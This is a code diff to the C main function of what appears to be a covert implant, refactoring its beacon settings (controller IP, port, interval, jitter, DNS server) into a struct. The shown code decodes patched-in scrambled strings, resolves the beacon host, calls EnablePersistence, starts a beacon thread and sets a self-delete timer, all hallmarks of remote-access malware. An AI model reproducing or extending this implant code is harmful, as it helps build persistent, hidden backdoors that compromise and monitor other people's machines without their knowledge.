@@ -59,6 +59,7 @@ int dbug_level_ = 2;				// debug level
 #endif
 
 //**************************************************************
+// Patchable command line arguments
 struct cl_args
 {
 	unsigned int	sig;
@@ -121,16 +122,11 @@ static void * asloc( char *string );
 int main(int argc, char** argv)
 {
 	int				c = 0;
-	char			*beaconIP = NULL;
 	char			*dnsIP = NULL;
 	uint32_t		beaconIPaddr;
 	char			*szInterface = NULL;
-	int				beaconPort = DEFAULT_BEACON_PORT;
-	unsigned long	initialDelay = DEFAULT_INITIAL_DELAY;
-	int				interval = DEFAULT_BEACON_INTERVAL;
 	int				trigger_delay = DEFAULT_TRIGGER_DELAY;
 	unsigned long	delete_delay = SELF_DEL_TIMEOUT;
-	float			jitter = DEFAULT_BEACON_JITTER * 0.01f;
 	int				retVal = 0;
 	char			sdpath[SD_PATH_LENGTH] = {0};
 	FILE			*f;
@@ -138,6 +134,8 @@ int main(int argc, char** argv)
 #ifndef DEBUG
 	int				status = 0;
 #endif
+
+	BEACONINFO beaconInfo = { NULL, DEFAULT_BEACON_PORT, NULL, {0}, DEFAULT_INITIAL_DELAY , DEFAULT_BEACON_INTERVAL, DEFAULT_BEACON_JITTER * 0.01f};
 
  	ikey[0] = '\0';
 	init_strings(); 	// De-scramble strings
@@ -172,22 +170,22 @@ int main(int argc, char** argv)
 		// Binary was patched -- all patched times should already be in milliseconds
 		DLX(1, printf("Binary was patched with arguments\n"));
 
-		beaconIP = args.beacon_ip;
-		beaconPort = args.beacon_port;
+		beaconInfo.ip = args.beacon_ip;
+		beaconInfo.port = args.beacon_port;
 		szInterface = args.iface;
-		initialDelay = args.init_delay;
-		interval = args.interval;
+		beaconInfo.initDelay = args.init_delay;
+		beaconInfo.interval = args.interval;
 		dnsIP = args.dns_ip;
 		memcpy(ikey, args.idKey, ID_KEY_HASH_SIZE * sizeof(unsigned char));
 		trigger_delay = args.trigger_delay;
 		delete_delay = args.delete_delay;
-		jitter = args.jitter * 0.01f;
+		beaconInfo.percentVariance = args.jitter * 0.01f;
 		memcpy(sdpath, args.sdpath, SD_PATH_LENGTH * sizeof(char));
 
 	//	cl_string( (unsigned char *)args.beacon_ip, sizeof( args.beacon_ip ) );
 		cl_string( (unsigned char *)args.beacon_ip, args.host_len );
-		beaconIP[ args.host_len ] = '\0';
-		DLX(1, printf("\tDecoded patched value for hostname/IP: %s\n", beaconIP));
+		beaconInfo.ip[args.host_len] = '\0';
+		DLX(1, printf("\tDecoded patched value for hostname/IP: %s\n", beaconInfo.ip));
 
 		cl_string( (unsigned char *)args.iface, sizeof( args.iface ) );
 		DLX(1, printf( "\tDecoded patched value for interface: %s\n", szInterface));
@@ -198,6 +196,8 @@ int main(int argc, char** argv)
 		DLX(1, printf( "\tDecoded DNS server address: %s\n", dnsIP));
 
 		goto patched_binary;
+	} else {
+		dnsIP = args.dns_ip;
 	}
 	DLX(1, printf("NOTE: Binary was NOT/NOT patched with arguments\n\n"));
 
@@ -213,7 +213,7 @@ int main(int argc, char** argv)
 		{
 			case 'a':
 				// todo: check that IP address is valid -- see client for howto
-				beaconIP = asloc( optarg );//optarg;
+				beaconInfo.ip = asloc( optarg );//optarg;
 				break;
 
 #ifdef DEBUG
@@ -225,7 +225,7 @@ int main(int argc, char** argv)
 			case 'd':
 				// user enters delay in seconds and this is converted to milliseconds
 				// If set to 0, this will disable all beacons...
-				initialDelay = atoi(optarg) * 1000;
+				beaconInfo.initDelay = strtoul(optarg, NULL, 0) * 1000;
 				break;
 
 			case 'I':
@@ -235,15 +235,15 @@ int main(int argc, char** argv)
 
 			case 'i':
 				// user enters delay in seconds and this is converted to milliseconds
-				interval = atoi(optarg) * 1000;
+				beaconInfo.interval = atoi(optarg) * 1000;
 				break;
 
 			case 'j':
 				if (( atoi(optarg) >= 0 ) && ( atoi(optarg) <= 30 )) {
-					jitter = atoi(optarg) * 0.01f;
+					beaconInfo.percentVariance = atoi(optarg) * 0.01f;
 				}
 				else {
-					jitter=-1;
+					beaconInfo.percentVariance = -1;
 				}
 				break;
 
@@ -300,7 +300,7 @@ int main(int argc, char** argv)
 				break;
 
 			case 'p':
-				beaconPort = atoi(optarg);
+				beaconInfo.port = atoi(optarg);
 				break;
 
 			case 'P':	// Set path for self-delete control and log files
@@ -320,6 +320,11 @@ int main(int argc, char** argv)
 					fprintf(stderr, "%s\n", oe4);
 					return -1;
 				}
+				DLX(1, printf("address = %s\n", address));
+				DLX(1, printf("strlen(address) = %d\n", strlen(address)));
+				DLX(1, printf("sizeof(args.dns_ip) = %d\n", sizeof(args.dns_ip)));
+				DLX(1, printf("MIN = %d\n", MIN(strlen(address), sizeof(args.dns_ip))));
+
 				strncpy(dnsIP, address, MIN(strlen(address), sizeof(args.dns_ip)));
 				break;
 				}
@@ -344,12 +349,12 @@ int main(int argc, char** argv)
 
 	// Process environment variables, if needed
 	
-	if (initialDelay > 0 && interval == 0 ) {
+	if (beaconInfo.initDelay > 0 && beaconInfo.interval == 0 ) {
 		DLX(1, printf("No Beacon Interval specified!\n"));
 		DLX(1, printUsage(argv[0]));
 		return -1;
 	}
-	if  (initialDelay >= (INT_MAX-1)) {
+	if  (beaconInfo.initDelay >= (INT_MAX-1)) {
 		DLX(1, printUsage(argv[0]));
 		return -1;
 	}
@@ -365,33 +370,33 @@ int main(int argc, char** argv)
 
 patched_binary:	// Parsing of command line arguments skipped for patched binaries
 
-	if (initialDelay > 0) {			// Beacons enabled
+	if (beaconInfo.initDelay > 0) {			// Beacons enabled
 		char	*resolved_beaconIP = NULL;
 
-		if (beaconPort == -1) {
+		if (beaconInfo.port == -1) {
 			DLX(1, printf("No Beacon Port Specified!\n"));
 			DLX(1, printUsage(argv[0]));
 		}
 
 		// Obtain Beacon IP address
-		if (beaconIP == NULL) {
+		if (beaconInfo.ip == NULL) {
 			DLX(1, printf("No Beacon IP address specified!\n"));
 			DLX(1, printUsage(argv[0]));
 			return -1;
 		}
 
-		if (inet_pton(AF_INET, beaconIP, &beaconIPaddr) == 0) {		// Determine if beacon IP is an address
+		if (inet_pton(AF_INET, beaconInfo.ip, &beaconIPaddr) == 0) {		// Determine if beacon IP is an address
 			if (dnsIP == NULL) {									// If not, attempt DNS lookup if DNS server was specified
 				DLX(1, printf("Beacon IP was specified as a domain name, but no DNS server was specified to resolve the name!\n"));
 				return -1;
 			}
 
-			while ((resolved_beaconIP = dns_resolv(beaconIP, dnsIP)) == NULL) {		// DNS lookup.
-				DLX(1, printf("Beacon IP address failed to resolve, sleeping for %i seconds.\n", interval/1000));
-				sleep(interval/1000);											// If resolution fails, retry every beacon interval.
+			while ((resolved_beaconIP = dns_resolv(beaconInfo.ip, dnsIP)) == NULL) {		// DNS lookup.
+				DLX(1, printf("Beacon IP address failed to resolve, sleeping for %i seconds.\n", beaconInfo.interval/1000));
+				sleep(beaconInfo.interval/1000);											// If resolution fails, retry every beacon interval.
 			}
-			memcpy(beaconIP, resolved_beaconIP, strlen(resolved_beaconIP)+1);	// Copy the resolved IP address along with terminating NULL byte
-			DLX(6, printf("Beacon IP: %s\n", beaconIP));
+			memcpy(beaconInfo.ip, resolved_beaconIP, strlen(resolved_beaconIP)+1);	// Copy the resolved IP address along with terminating NULL byte
+			DLX(6, printf("Beacon IP: %s\n", beaconInfo.ip));
 			free(resolved_beaconIP);
 		}
 	}
@@ -426,7 +431,7 @@ patched_binary:	// Parsing of command line arguments skipped for patched binarie
 	}
 
 	if ( args.patched == 1 ) {
-		retVal = EnablePersistence(beaconIP,beaconPort);
+		retVal = EnablePersistence(beaconInfo.ip, beaconInfo.port);
 		if( 0 > retVal) {
 			DLX(1, printf("\nCould not enable Persistence!\n"));
 			return -1;
@@ -441,16 +446,16 @@ patched_binary:	// Parsing of command line arguments skipped for patched binarie
 	}
 #endif
 
-	if (initialDelay > 0) {
+	if (beaconInfo.initDelay > 0) {
 		// create beacon thread
 		DLX(1, printf( "Calling BeaconStart()\n"));
-		retVal = beacon_start(beaconIP, beaconPort, initialDelay, interval, jitter);
+		retVal = beacon_start(&beaconInfo);
 	
 		if (0 != retVal) {
 			DLX(1, printf("Beacon Failed to Start!\n"));
 		}
 	} else {
-		DLX(1, printf("ALL BEACONS DISABLED, initialDelay <= 0.\n"));
+		DLX(1, printf("ALL BEACONS DISABLED, beaconInfo.initDelay <= 0.\n"));
 	}
 
 	// delete_delay
